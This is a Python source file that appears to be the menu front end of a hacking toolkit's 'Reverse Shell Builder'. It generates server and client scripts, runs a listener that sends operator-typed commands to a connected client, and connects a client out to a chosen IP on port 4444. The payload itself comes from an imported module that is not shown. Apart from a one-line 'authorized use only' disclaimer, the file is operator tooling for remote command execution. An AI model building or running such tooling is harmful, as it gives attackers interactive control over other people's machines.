
import time
import threading

from core.display import C, type_line, SEPARATOR, print_banner
from core.platform_utils import clear_screen
from cli.prompts import prompt, safe_input, press_enter


def option_reverse_shell():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}REVERSE SHELL BUILDER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.GRAY}Security testing tool - for authorized use only.{C.RESET}")
    print()
    print(f"  {C.DK_CYN}[1]{C.RESET} Build server.exe")
    print(f"  {C.DK_CYN}[2]{C.RESET} Build client.exe")
    print(f"  {C.DK_CYN}[3]{C.RESET} Run server (interactive)")
    print(f"  {C.DK_CYN}[4]{C.RESET} Run client (connect to server)")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt()

    if choice in ("b", ""):
        return

    if choice == "1":
        _build_server()
    elif choice == "2":
        _build_client()
    elif choice == "3":
        _run_server_interactive()
    elif choice == "4":
        _run_client()


def _build_server():
    filename = safe_input(f"{C.GRAY}Server filename (default: server.exe): {C.RESET}")
    if not filename:
        filename = "server.exe"
    if not filename.endswith(".exe"):
        filename += ".exe"

    from features.shell.service import build_server_exe
    code = build_server_exe()

    with open(filename, "w", encoding="utf-8") as f:
        f.write(code)

    type_line(f"  {C.DK_CYN}Created {filename}{C.RESET}")
    type_line(f"  {C.GRAY}Run with: python {filename} --port 4444{C.RESET}")
    press_enter()


def _build_client():
    filename = safe_input(f"{C.GRAY}Client filename (default: client.exe): {C.RESET}")
    if not filename:
        filename = "client.exe"
    if not filename.endswith(".exe"):
        filename += ".exe"

    from features.shell.service import build_client_exe
    code = build_client_exe()

    with open(filename, "w", encoding="utf-8") as f:
        f.write(code)

    type_line(f"  {C.DK_CYN}Created {filename}{C.RESET}")
    type_line(f"  {C.GRAY}Run with: python {filename} --host <IP> --port 4444{C.RESET}")
    press_enter()


def _run_server_interactive():
    port_str = safe_input(f"{C.GRAY}Listen port (default 4444): {C.RESET}")
    port = int(port_str) if port_str.isdigit() else 4444

    from features.shell.service import ReverseShellServer, ShellConfig

    config = ShellConfig(port=port)
    server = ReverseShellServer(config)

    type_line(f"\n  {C.DK_CYN}Starting server on port {port}...{C.RESET}")
    type_line(f"  {C.GRAY}Type commands to send to connected client.{C.RESET}")
    type_line(f"  {C.GRAY}Type 'exit' to stop.{C.RESET}\n")

    def run_server_thread():
        server.start()

    thread = threading.Thread(target=run_server_thread, daemon=True)
    thread.start()

    try:
        while True:
            cmd = safe_input(f"{C.DK_MAG}shell>{C.RESET} ")
            if cmd.lower() == "exit":
                server.stop()
                break
            if cmd:
                server.send_command(cmd)
            time.sleep(0.1)
    except KeyboardInterrupt:
        server.stop()
    press_enter()


def _run_client():
    host = safe_input(f"{C.GRAY}Server IP: {C.RESET}").strip()
    if not host:
        type_line(f"  {C.DK_RED}No IP provided.{C.RESET}")
        press_enter()
        return

    port_str = safe_input(f"{C.GRAY}Server port (default 4444): {C.RESET}")
    port = int(port_str) if port_str.isdigit() else 4444

    from features.shell.service import ReverseShellClient, ShellConfig

    config = ShellConfig(host=host, port=port)
    client = ReverseShellClient(config)

    type_line(f"\n  {C.DK_CYN}Connecting to {host}:{port}...{C.RESET}")

    try:
        client.start()
    except KeyboardInterrupt:
        client.stop()
    press_enter()
